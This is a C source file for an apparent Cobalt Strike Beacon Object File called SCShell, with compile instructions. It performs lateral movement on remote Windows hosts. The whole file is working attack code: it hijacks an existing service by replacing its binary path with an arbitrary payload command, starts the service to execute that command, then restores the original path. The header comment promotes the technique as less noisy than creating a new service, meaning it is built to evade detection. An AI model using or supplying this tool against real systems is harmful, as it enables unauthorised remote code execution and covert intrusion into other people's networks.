/*
 * BOF: Service Control Shell (SCShell)
 *
 * Modifies an existing service's binary path on a remote host, starts
 * the service to execute the payload, then reverts the original config.
 * Less noisy than creating a new service.
 *
 * Compile: x86_64-w64-mingw32-gcc -c scshell.c -o scshell.o
 *
 * Arguments (packed via BeaconDataParse):
 *   [wchar*] target       - remote hostname or IP
 *   [wchar*] service_name - existing service to hijack (e.g. SensorService)
 *   [wchar*] payload_cmd  - command to execute
 */

#include <windows.h>
#include "../bof_api.h"

DECLSPEC_IMPORT SC_HANDLE WINAPI ADVAPI32$OpenSCManagerW(LPCWSTR, LPCWSTR, DWORD);
DECLSPEC_IMPORT SC_HANDLE WINAPI ADVAPI32$OpenServiceW(SC_HANDLE, LPCWSTR, DWORD);
DECLSPEC_IMPORT BOOL      WINAPI ADVAPI32$QueryServiceConfigW(SC_HANDLE, LPQUERY_SERVICE_CONFIGW, DWORD, LPDWORD);
DECLSPEC_IMPORT BOOL      WINAPI ADVAPI32$ChangeServiceConfigW(SC_HANDLE, DWORD, DWORD, DWORD,
    LPCWSTR, LPCWSTR, LPDWORD, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR);
DECLSPEC_IMPORT BOOL      WINAPI ADVAPI32$StartServiceW(SC_HANDLE, DWORD, LPCWSTR *);
DECLSPEC_IMPORT BOOL      WINAPI ADVAPI32$CloseServiceHandle(SC_HANDLE);

DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT HGLOBAL WINAPI KERNEL32$GlobalAlloc(UINT, SIZE_T);
DECLSPEC_IMPORT HGLOBAL WINAPI KERNEL32$GlobalFree(HGLOBAL);

void go(char *args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);

    wchar_t *target       = (wchar_t *)BeaconDataExtract(&parser, NULL);
    wchar_t *service_name = (wchar_t *)BeaconDataExtract(&parser, NULL);
    wchar_t *payload_cmd  = (wchar_t *)BeaconDataExtract(&parser, NULL);

    if (!target || !service_name || !payload_cmd) {
        BeaconPrintf(CALLBACK_ERROR, "Usage: scshell <target> <service_name> <payload_cmd>");
        return;
    }

    SC_HANDLE hSCM = ADVAPI32$OpenSCManagerW(target, NULL, SC_MANAGER_CONNECT);
    if (!hSCM) {
        BeaconPrintf(CALLBACK_ERROR, "OpenSCManagerW failed: %lu", KERNEL32$GetLastError());
        return;
    }

    SC_HANDLE hSvc = ADVAPI32$OpenServiceW(hSCM, service_name,
        SERVICE_QUERY_CONFIG | SERVICE_CHANGE_CONFIG | SERVICE_START);
    if (!hSvc) {
        BeaconPrintf(CALLBACK_ERROR, "OpenServiceW '%S' failed: %lu",
                     service_name, KERNEL32$GetLastError());
        ADVAPI32$CloseServiceHandle(hSCM);
        return;
    }

    /* Query original config so we can revert later */
    DWORD cbNeeded = 0;
    ADVAPI32$QueryServiceConfigW(hSvc, NULL, 0, &cbNeeded);

    LPQUERY_SERVICE_CONFIGW origCfg = (LPQUERY_SERVICE_CONFIGW)KERNEL32$GlobalAlloc(0, cbNeeded);
    if (!origCfg || !ADVAPI32$QueryServiceConfigW(hSvc, origCfg, cbNeeded, &cbNeeded)) {
        BeaconPrintf(CALLBACK_ERROR, "QueryServiceConfigW failed: %lu", KERNEL32$GetLastError());
        ADVAPI32$CloseServiceHandle(hSvc);
        ADVAPI32$CloseServiceHandle(hSCM);
        if (origCfg) KERNEL32$GlobalFree(origCfg);
        return;
    }

    wchar_t *originalBinPath = origCfg->lpBinaryPathName;
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Original binPath: %S", originalBinPath);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Setting binPath -> %S", payload_cmd);

    /* Swap binary path to our payload */
    if (!ADVAPI32$ChangeServiceConfigW(hSvc, SERVICE_NO_CHANGE, SERVICE_DEMAND_START,
            SERVICE_NO_CHANGE, payload_cmd, NULL, NULL, NULL, NULL, NULL, NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "ChangeServiceConfigW (set) failed: %lu", KERNEL32$GetLastError());
        goto cleanup;
    }

    /* Start the service — will run our command */
    if (!ADVAPI32$StartServiceW(hSvc, 0, NULL)) {
        DWORD err = KERNEL32$GetLastError();
        if (err != 1053) {
            BeaconPrintf(CALLBACK_ERROR, "StartServiceW failed: %lu", err);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[*] Service triggered (timeout expected)");
        }
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Service started");
    }

    /* Revert to original binary path */
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Reverting binPath -> %S", originalBinPath);
    if (!ADVAPI32$ChangeServiceConfigW(hSvc, SERVICE_NO_CHANGE, origCfg->dwStartType,
            SERVICE_NO_CHANGE, originalBinPath, NULL, NULL, NULL, NULL, NULL, NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "ChangeServiceConfigW (revert) failed: %lu", KERNEL32$GetLastError());
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Config reverted successfully");
    }

cleanup:
    KERNEL32$GlobalFree(origCfg);
    ADVAPI32$CloseServiceHandle(hSvc);
    ADVAPI32$CloseServiceHandle(hSCM);
}
